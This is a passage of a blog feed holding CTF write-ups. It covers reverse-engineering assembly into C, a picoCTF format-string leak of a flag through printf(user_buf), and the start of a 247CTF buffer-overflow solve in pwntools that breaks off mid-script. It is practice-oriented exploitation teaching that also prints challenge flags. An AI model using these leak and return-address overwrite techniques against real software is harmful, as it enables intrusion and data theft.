rbx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  pop     rbp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  ret</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>Block 7 was the point where the main function deallocated stack memory and returned. I expected this to be the end of the main function.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="running-the-executable">Running the executable<a class="hash-link" href="#running-the-executable" title="Direct link to heading">​</a></h3><p>I ran the executable and observed its behavior to compare my understanding of the assembly.</p><p>The first character of every <code>word</code> was capitalized if it was a letter. All uppercase letters after the first for each <code>word</code> were changed to lowercase. Words were separated by spaces.</p><p>This lined up with the assembly as a flag (<code>[rbp-0x15]</code>) handles the control flow for whether a character should be capitalized or made lowercase.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="solving-the-challenge">Solving the challenge<a class="hash-link" href="#solving-the-challenge" title="Direct link to heading">​</a></h2><p>I wrote up a program in c to match the executable's behavior along with what I knew from the assembly. I had to modify <code>if</code> statements a few times for the control flow to match in assembly.</p><div class="codeBlockContainer_I0IT language-c theme-code-block"><div class="codeBlockContent_wNvx" style="color:#393A34;background-color:#f6f8fa"><pre tabindex="0" class="prism-code language-c codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;ctype.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;stdio.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">// glhf</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> flag</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> letter</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    letter </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">getc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">stdin</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">letter </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token keyword" style="color:#00009f">break</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">isspace</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">letter</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     </span><span class="token function" style="color:#d73a49">putc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">letter</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">stdout</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">putc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">toupper</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">letter</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">stdout</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">putc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">tolower</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">letter</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">stdout</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><h2 class="anchor anchorWithStickyNavbar_mojV" id="conclusion">Conclusion<a class="hash-link" href="#conclusion" title="Direct link to heading">​</a></h2><p>This was an interesting challenge and helped me gain a better understanding of the relationship between c and assembly. I learned about calling conventions and how to read the control flow of assembly.</p>]]></content>
        <author>
            <name>Christopher Nguyen</name>
            <uri>https://github.com/christopher-nguyen-re</uri>
        </author>
        <category label="CTF" term="CTF"/>
        <category label="Binary Exploitation" term="Binary Exploitation"/>
        <category label="decompetition" term="decompetition"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Stonks]]></title>
        <id>stonks</id>
        <link href="https://christopher-nguyen-re.github.io/blog/stonks"/>
        <updated>2022-02-14T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Pico CTF: Stonks]]></summary>
        <content type="html"><![CDATA[<p>Pico CTF: Stonks</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="the-challenge">The Challenge<a class="hash-link" href="#the-challenge" title="Direct link to heading">​</a></h2><p>This challenge can be found <a href="https://play.picoctf.org/practice/challenge/105?bookmarked=0&amp;page=1&amp;search=stonks" target="_blank" rel="noopener noreferrer">here</a>.</p><p>The provided source file <a target="_blank" href="/assets/files/vuln-cf434296ffbb139691a6800cf249b9ff.c">here</a>
Given an application, the goal is to find the flag.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="analysis">Analysis<a class="hash-link" href="#analysis" title="Direct link to heading">​</a></h2><p>I first looked through the source file to get an idea of where the flag could be stored within the program. In main, the buy_stonks function opens a file and stores the flag into api_buf. The location of api_buf on the stack would be a point of interest.</p><div class="codeBlockContainer_I0IT language-c theme-code-block"><div class="codeBlockContent_wNvx" style="color:#393A34;background-color:#f6f8fa"><pre tabindex="0" class="prism-code language-c codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">buy_stonks</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Portfolio </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">!</span><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> api_buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">FLAG_BUFFER</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    FILE </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">f </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">fopen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"api"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">"r"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">!</span><span class="token plain">f</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Flag file not found. Contact an admin.\n"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">exit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">fgets</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">api_buf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> FLAG_BUFFER</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> f</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> money </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> p</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">money</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> shares </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Stonk </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">temp </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Using patented AI algorithms to buy stonks\n"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">money </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        shares </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">rand</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> money</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        temp </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">pick_symbol_with_AI</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">shares</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        temp</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">next </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> p</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">head</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        p</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">head </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> temp</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        money </span><span class="token operator" style="color:#393A34">-=</span><span class="token plain"> shares</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Stonks chosen\n"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// TODO: Figure out how to read token from file, for now just ask</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">user_buf </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">malloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">300</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"What is your API token?\n"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">scanf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"%300s"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> user_buf</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Buying stonks with token:\n"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">user_buf</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// TODO: Actually use key to interact with API</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">view_portfolio</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>There is a printf vulnerability where <code>printf(user_buf)</code> is called. <code>scanf</code> stores input from stdin into user_buf, allowing us to manipulate the format string interpreted by the printf function. Entering %x as input resulted in the following output.</p><p><img loading="lazy" alt="stonks %x output" src="/assets/images/stonks_percent_x-b4fb3363928cbaf82eda55a94d1d7467.png" width="451" height="242" class="img_E7b_"></p><p>This worked because the x86 calling convention retrieves parameters requested in the format string from the stack. The <code>printf</code> function cannot determine a mismatch between the format string and the number of arguments provided in the <code>printf</code> function. The function does not have a marked boundary so it will fetch data that does not belong to the function call.</p><p>The output turned out to be an address on the stack. The location of api_buf was further up the stack so I hand jammed a lot of %x's into user_buf to try and find api_buf. Looking through the various data on the stack, I notice 6f636970. The converted output from hex to ascii resulted in 'ocip' which meant that the machine was little endian. I read all the data from 'ocip' until a null byte and obtained the flag. The exact offset was 56 bytes away from user_buf. The full flag was 'picoCTF{I_l05t_4ll_my_m0n3y_c7cb6cae}'.</p>]]></content>
        <author>
            <name>Christopher Nguyen</name>
            <uri>https://github.com/christopher-nguyen-re</uri>
        </author>
        <category label="CTF" term="CTF"/>
        <category label="Binary Exploitation" term="Binary Exploitation"/>
        <category label="Pico CTF" term="Pico CTF"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Hidden Flag Function]]></title>
        <id>hidden_flag_function</id>
        <link href="https://christopher-nguyen-re.github.io/blog/hidden_flag_function"/>
        <updated>2022-02-08T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[247CTF: Hidden Flag Function]]></summary>
        <content type="html"><![CDATA[<p>247CTF: Hidden Flag Function</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="the-challenge">The Challenge<a class="hash-link" href="#the-challenge" title="Direct link to heading">​</a></h2><p>This challenge can be found <a href="https://247ctf.com/dashboard" target="_blank" rel="noopener noreferrer">here</a>.</p><p>Given an application, the goal is to gain control of the application flow and gain access to the hidden flag function.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="analysis">Analysis<a class="hash-link" href="#analysis" title="Direct link to heading">​</a></h2><p>I plugged the provided program into Ghidra and looked at the function call graph. I started from _start() and then looked into the main function.</p><p><img loading="lazy" alt="Main function" src="/assets/images/hidden_flag_function_main-0b0a478d4c5be92af4313f3336cd79be.png" width="496" height="280" class="img_E7b_"></p><p>The function <code>chall</code> takes user input by using scanf and stores it into a 68 byte buffer before returning. After some more digging, I find a function called flag.</p><p><img loading="lazy" alt="Flag function" src="/assets/images/hidden_flag_function_flag-a6516f5c6452eb0c8e48e5130ba75a22.png" width="477" height="245" class="img_E7b_"></p><p>The scanf command from chall was a point of interest as I would have been able to overwrite the address stored in the return from function. I wanted the return to execute the flag function and get the flag.</p><p>I ran the <code>file</code> command on the executable and found that it was 32 bit little endian. It did not state that the program was a position independent executable. I needed to install i386 architecture as I could not run it natively on my ubuntu 64 bit system.</p><div class="codeBlockContainer_I0IT language-bash theme-code-block"><div class="codeBlockContent_wNvx" style="color:#393A34;background-color:#f6f8fa"><pre tabindex="0" class="prism-code language-bash codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> dpkg --add-architecture i386</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">apt-get</span><span class="token plain"> update</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">apt-get</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> libc6:i386 libncurses5:i386 libstdc++6:i386</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>I also set core_pattern in /proc/sys/kernel to output coredumps to a file named core. This is needed in order to help with determining offsets within the executable.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="the-solve">The Solve<a class="hash-link" href="#the-solve" title="Direct link to heading">​</a></h2><div class="codeBlockContainer_I0IT language-python theme-code-block"><div class="codeBlockContent_wNvx" style="color:#393A34;background-color:#f6f8fa"><pre tabindex="0" class="prism-code language-python codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exe </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"./hidden_flag_function"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">context</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">binary </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">context</span><span class="token punctuation" 